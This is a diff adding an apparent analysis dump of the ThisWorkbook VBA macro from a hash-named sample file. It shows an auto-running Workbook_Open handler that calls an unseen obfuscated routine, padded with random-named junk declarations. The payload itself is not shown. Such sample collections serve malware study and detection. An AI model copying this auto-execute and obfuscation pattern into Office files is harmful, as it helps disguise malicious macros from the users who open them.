@@ -1,0 +1,70 @@
+Filename     : ./macros/b8e36063ef01b65838b4c9bae830c3509c40fdeedae26194de8945c73622f48f
+OLE stream   : VBA/ThisWorkbook
+VBA filename : ThisWorkbook.cls
+----------------------------------------
+Attribute VB_Name = "ThisWorkbook"
+Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = True
+Private Sub workbook_open()
+
+
+juxOIxxYyiSHAszmQdl.AdteTRQiFtikRdJSoqcc
+Dim GwduIyuWsNJAp As Byte
+If YwTsLFiOZNcQuuuSwotnQQDAzWUWuqrjhusgpZdltNhjBeNEAE = vZQNZHtTtplMTjVtizBNcXKIuCjTzVIPVquSTUVknWfozgtxOH Then
+Dim vOCmbYOISWYZUYhVrd As Date
+Dim oDZNeRaFrWINJlFrZuNiOVDLBzMNBHHepQJLhijlMVgrzF
+Dim NmTdymIIOSzOLfEMDkPeXs As Date
+End If
+Dim cuJrKbWtpM As Byte
+If LwmZuYIUVhCqLTWEhzRwbVhUKZTHcglUdn = DPtfSfcvIqpmiqUFuXbskqORPUEArovhMYPHLBhmUfMreXqdnWmOtlCMAb Then
+Dim QxabDTuIZKaMusqoYEdXmrdbNVChnbVDGjl As Date
+Dim jMtctwWygDabtXFMxjdoYTyNiRMUyoXGKHGcfckaQtx
+Dim YmtIJiOXUcuMPNfubjBzsgUQmRchVyDYfWaboIDljQDdP As Date
+End If
+Dim urOAiIqOtFsRcVsFhCVZWgsmDFTgQPbdrAs As Byte
+If ZOhnpMJmRiJLnKfC = OhDtNycwcpJyddOabdTrAPgMNu Then
+Dim bDuugWkNNvnHebllKzDKInTijJrnCzArfTWYBhJmOQQSnUyrFOEgIClokL As Date
+Dim KWfwKNvwbLENjcqQwsWAvPLzhnvTid
+Dim hhoqXnHRFDXqsmns As Date
+End If
+Dim fbqsGtSjPvKfOXSb As Byte
+If NyeWZtFDIemTdEWZMpITdpWnPFabcbDikvdtHQTmVnjcGzFKYkTYPyyXb = rHTSeahaEihbcSvW Then
+Dim VyqGugQzPDsIeTlx As Date
+Dim FRQJzTqMCBCQXjvSXCtzHRhKrUDbiY
+Dim wkwjWLCmXCHdEsdzbgHakcalpokFSeQPedFRUoMkPlfqseNogssWT As Date
+End If
+
+
+Dim HoTKKuiawUsl As Byte
+If syanMenTWKywjtLavYZmtvWplHJteJTRnEAfnBUNEDwxpXbR = iHeXuFswckBEVtoMrhJetfnuEMhqyZAOgrLXevWhMEDCzP Then
+Dim rLOjGHNwYCTkThXBxCknYeiRivKbSpcluoVWbOTsAjTIDubpJLGB As Date
+Dim RLrNcxBKwmeiaipfLBZiisnpKZNnTVRGibUjxIueMJvN
+Dim FkiVEwdIlYSYYBCCj As Date
+End If
+Dim OqbUXAyNGiDHuVZwZjZrrjXsJVKJvKvFruySUthkjI As Byte
+If xOZBqDsbyScLreTjLCqpRvmxPAWGcgBpHjlISHeGQUMdcfCTzlif = uuqBbblqgm Then
+Dim ySQnDItKQDXjZxjJUkxCHrxWvNtjhqWnadVtNpbuaoUeHKVtSS As Date
+Dim HBsdeHUtsqPJdahkJvbpwfICbTWTOkrzROjUuwzN
+Dim YTwkfRKtxXBaRcVbtpBLkBe As Date
+End If
+Dim IzPrOrMpMwNRciXXKIdVriRhptHbFundXpolQZvCkioeDLtsVSrCHf As Byte
+If nZhhCVjlkSIktnulHkNalJundez = PGmDkVrCPDiXZTzyWVTRFyjLGphudfuDXVUfxPXPCl Then
+Dim eiYNnHmKXRKNu As Date
+Dim QWbwuoxYkJfAEzUAHxEPUTBmtCaISH
+Dim csKbDIWSdaENuYtMjIRKQUGxZwUoD As Date
+End If
+Dim sOpFchmpcvLepUdKHZcsgTSqIrImMBGohOkMPHS As Byte
+If rHXGMGfazcnSXrwXYvywkYzdboXxajQvzGllJNFjdQIJZjjw = krLQQLhSIufYjiAPLsTQG Then
+Dim LNLqPTTQpDsFaMiXAe As Date
+Dim nZScPihAvPsyhPSpZeAaBsOBSqnTIVSrLNfrni
+Dim ydJPXDYrWcmlmEXZdvLQKYuNrZxAmTkbCrfWRmUKdbTKhXjOUm As Date
+End If
+
+
+End Sub
+
